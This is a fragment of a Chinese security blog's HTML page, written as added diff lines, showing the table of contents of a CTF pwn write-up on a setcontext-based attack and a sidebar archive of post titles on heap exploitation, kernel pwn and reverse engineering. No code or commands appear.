+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">爆破用户名和密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E4%B8%8E%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">控制流与加密</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%EF%BC%88%E9%87%8D%E8%A6%81%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">攻击思路（重要）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsetcontext%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是setcontext？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE%E2%80%A6"><span class="toc-number">2.2.</span> <span class="toc-text">回到题目…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90"><span class="toc-number">2.3.</span> <span class="toc-text">一些板子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 53
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span>
+            <a class="archive-post-title" href="/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/">常见的加密算法逆向识别</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/">CHOP——强网杯2024expect_number wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heap实战——强网杯2024babyheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/">How2Heap实战——网鼎杯database wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span>
+            <a class="archive-post-title" href="/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">页表之上——Linux内核的内存管理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span>
+            <a class="archive-post-title" href="/2024/10/28/Algorithm(0)/">Algorithm(0)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/">记录一次护网行动</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/">Android逆向入门之2015-AliCrackme</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span>
+            <a class="archive-post-title" href="/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/">Kernel Pwn从入门到入土-2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span>
+            <a class="archive-post-title" href="/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/">CVE-2024-26229青春版_WindowsKernelPWN</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span>
+            <a class="archive-post-title" href="/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/">现代内核安全机制——以Windows 11的kernel pwn为例</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span>
+            <a class="archive-post-title" href="/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/">ByteCTF2024——ezheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span>
+            <a class="archive-post-title" href="/2024/09/24/Algorithm%EF%BC%881%EF%BC%89/">Algorithm（1）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2024/09/19/STL%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8CSTLWP/">STL容器逆向——逆向工程实验STLWP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2024/09/19/Windows%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C2022WP/">Windows函数隐藏——逆向工程实验2022WP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span>
+            <a class="archive-post-title" href="/2024/09/16/WMCTF2024evm%E9%9D%9E%E9%A2%84%E6%9C%9F/">WMCTF2023evm非预期</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span>
+            <a class="archive-post-title" href="/2024/09/11/Windows%E4%B8%8B%E7%9A%84%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">Windows下的简单逆向分析入门——从PE开始</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span>
+            <a class="archive-post-title" href="/2024/09/10/LLVM%E5%88%86%E6%9E%90%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/">LLVM-Pass分析简单入门——暨2024WMCTF-babysignin WP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span>
+            <a class="archive-post-title" href="/2024/09/05/How2Heap-Protobuf%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024EzBuf/">How2Heap&Protobuf实战——CISCN2024EzBuf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/GO-rust%E7%AD%89%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91/">GO,rust等其他语言的逆向</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E6%8E%A2/">虚拟机初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span>
+            <a class="archive-post-title" href="/2024/08/30/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024-EzHeap/">How2Heap实战(2)——CISCN2024EzHeap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span>
+            <a class="archive-post-title" href="/2024/08/05/sandbox/">Sandbox  简单介绍</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-0/">Kernel Pwn从入门到入土-0</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/">Kernel Pwn从入门到入土-1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2024/07/28/How2Heap-8%E2%80%94%E2%80%94Tcache/">How2Heap(8)——Tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span>
+            <a class="archive-post-title" href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">How2Heap(7)——Large Bin Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/">How2Heap总集篇导演剪辑剧场版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/">How2Heap实战(1)——CISCN2024orange_cat_diary</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2024/07/11/CSAPP-Labs%E2%80%94%E2%80%94Malloc-Lab/">CSAPP Labs——Malloc Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="算法">
+                <span class="iconfont-archer">&#xe606;</span>
+                算法
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                Windows
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CVE">
+                <span class="iconfont-archer">&#xe606;</span>
+                CVE
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="protobuf">
+                <span class="iconfont-archer">&#xe606;</span>
+                protobuf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="kernel">
+                <span class="iconfont-archer">&#xe606;</span>
+                kernel
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="llvm">
+                <span class="iconfont-archer">&#xe606;</span>
+                llvm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="vm">
+                <span class="iconfont-archer">&#xe606;</span>
+                vm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="hvv">
+                <span class="iconfont-archer">&#xe606;</span>
+                hvv
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Web">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Web
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
